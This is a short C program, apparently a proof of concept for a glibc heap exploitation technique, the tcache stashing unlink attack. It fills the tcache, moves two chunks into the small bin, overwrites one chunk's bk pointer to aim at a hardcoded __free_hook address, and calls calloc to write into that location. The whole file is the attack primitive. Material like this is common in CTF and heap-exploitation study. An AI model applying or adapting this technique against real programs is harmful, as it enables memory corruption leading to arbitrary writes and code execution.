#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

#define __free_hook 0x7ffff7fb45a8

long long list[0x10] = {0};

void init() {
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stdin, 0, 1, 0);
	setvbuf(stderr, 0, 1, 0);
}

int main(){
	int size = 0x108;
	int i;
	long long *small1,*avoid_merge,*small2;
	// init all chunks, 2 small bin chunk
	// 7 tcache chunk
	small1 = malloc(size);
	avoid_merge = malloc(size);
	small2 = malloc(size);
	for(i=0;i<7;i++){
		list[i] = malloc(size);
	}
	sleep(0);
	// full tcache bin
	for(i=0;i<7;i++){
		free(list[i]);
	}
	// place two chunk into unsorted bin
	free(small1);
	free(small2);
	sleep(0);
	// malloc 0x200 to place two chunk into small bin
	malloc(0x200);
	// let tcache bin only have 6 chunks
	malloc(size);
	sleep(0);
	// change the small bin 2'bk to target_addr - 0x10
	*(small2 + 1) = __free_hook - 0x10;
	// calloc to get the chunk from small bin, not from tcache 
	calloc(1,size);
	sleep(0);
	return 0;
}
